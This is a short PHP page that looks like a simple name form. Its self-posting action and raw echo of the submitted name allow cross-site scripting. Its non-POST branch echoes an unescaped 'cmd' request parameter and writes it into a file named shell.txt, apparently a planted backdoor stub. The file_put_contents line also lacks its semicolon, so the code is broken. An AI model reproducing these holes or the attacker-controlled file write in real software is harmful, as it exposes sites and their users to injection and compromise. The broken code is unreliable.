<html>
<body>

<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
  Name: <input type="text" name="fname">
  <input type="submit">
</form>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // collect value of input field
  $name = $_REQUEST['fname'];
  if (empty($name)) {
    echo "Name is empty";
  } else {
    echo $name;
  }
  
}else {
  echo 'The request: ';
  echo $_REQUEST['cmd'];
  echo ' is sent!';
  file_put_contents("shell.txt", $_REQUEST['cmd'])
}
?>

</body>
</html>